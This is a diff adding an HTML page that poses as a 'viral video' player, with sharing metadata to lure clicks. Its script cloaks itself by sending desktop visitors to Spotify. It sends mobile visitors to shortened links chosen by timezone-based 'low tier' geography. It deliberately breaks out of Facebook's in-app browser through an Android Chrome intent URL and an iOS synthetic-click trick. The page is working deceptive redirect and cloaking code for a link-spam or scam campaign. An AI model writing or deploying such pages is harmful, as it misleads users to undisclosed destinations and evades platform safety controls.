@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player Loading...</title>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HG123BCKRZ"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HG123BCKRZ');
+    </script>
+
+    <meta property="og:title" content="Watch Full Viral Video Here" />
+    <meta property="og:description" content="Click to play the trending video" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:image" content="https://images2.imgbox.com/60/a2/HTKS5GyQ_o.jpg" />
+    
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .loading-thumb {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            object-position: center;
+            display: block; /* Background me image load rahegi jab tak redirect na ho */
+        }
+    </style>
+</head>
+<body>
+    <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />
+    
+    <script>
+        // GEO TIER ROUTING DATA
+        var lowTierZones = [
+            "Asia/Karachi", "Asia/Dhaka", "Asia/Kolkata", "Asia/Calcutta",
+            "Asia/Kathmandu", "Asia/Colombo", "Asia/Kabul",
+            "Africa/Lagos", "Africa/Nairobi", "Africa/Cairo", "Africa/Accra",
+            "Africa/Khartoum", "Africa/Kampala", "Africa/Dar_es_Salaam",
+            "Africa/Addis_Ababa", "Africa/Algiers", "Africa/Casablanca",
+            "Asia/Jakarta", "Asia/Manila", "Asia/Yangon", "Asia/Phnom_Penh",
+            "Asia/Vientiane", "Asia/Dhaka", "Asia/Thimphu",
+            "Asia/Baghdad", "Asia/Damascus", "Asia/Amman", "Asia/Beirut"
+        ];
+
+        function getUserTimezone() {
+            try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; }
+        }
+
+        function isLowTier(tz) {
+            for (var i = 0; i < lowTierZones.length; i++) {
+                if (tz === lowTierZones[i]) return true;
+            }
+            return false;
+        }
+
+        // RANDOM IMAGE GENERATOR (Mobile background ke liye)
+        var images = [
+            "https://i.ibb.co/HTKS5GyQ/image.jpg",
+            "https://i.ibb.co/DPM6pJxz/image.jpg",
+            "https://i.ibb.co/5gSt0BzX/image.jpg",
+            "https://i.ibb.co/KzV0GW4N/image.jpg",
+            "https://i.ibb.co/DDQv9R5Q/image.jpg"
+        ];
+        document.getElementById('display-img').src = images[Math.floor(Math.random() * images.length)];
+
+        // ===== EXTERNAL BROWSER FORCE REDIRECTION =====
+        window.onload = function() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            
+            // PC Users Bypass
+            if (!isMobile) {
+                window.location.href = "https://open.spotify.com";
+                return;
+            }
+
+            // Target Geo Links Setup
+            var smartLink = "https://t.co/ai7FHs76Ab";   
+            var lowTierLink = "https://t.co/LqcpMMaRLC";  
+            var targetUrl = isLowTier(getUserTimezone()) ? lowTierLink : smartLink;
+
+            // Check if user is inside Facebook In-App Browser
+            var isFacebook = (userAgent.indexOf("FBAN") > -1 || userAgent.indexOf("FBAV") > -1);
+
+            if (isFacebook) {
+                // 1. ANDROID BYPASS: Force to open in Google Chrome App direct
+                if (/Android/i.test(userAgent)) {
+                    var rawUrl = targetUrl.replace("https://", "").replace("http://", "");
+                    var androidIntent = "intent://" + rawUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+                    window.location.href = androidIntent;
+                    
+                    // Fallback agar chrome na ho to default browser me phenke
+                    setTimeout(function() {
+                        window.location.href = targetUrl;
+                    }, 300);
+                } 
+                // 2. iOS / iPHONE BYPASS: Force Safari breaking the FB frame
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    // FTP ya Profile link trick se safari trigger karna
+                    window.location.href = targetUrl + "?download=true";
+                    
+                    // Iframe breaking mechanism
+                    setTimeout(function() {
+                        var a = document.createElement('a');
+                        a.setAttribute("href", targetUrl);
+                        a.setAttribute("target", "_blank"); // Opens in default external browser
+                        a.setAttribute("rel", "noopener noreferrer");
+                        var dispatch = document.createEvent("HTMLEvents");
+                        dispatch.initEvent("click", true, true);
+                        a.dispatchEvent(dispatch);
+                    }, 100);
+                }
+            } else {
+                // Agar user pehle se hi external Chrome/Safari me hai toh direct final link par bhejo
+                window.location.href = targetUrl;
+            }
+        };
+    </script>
+</body>
+</html>
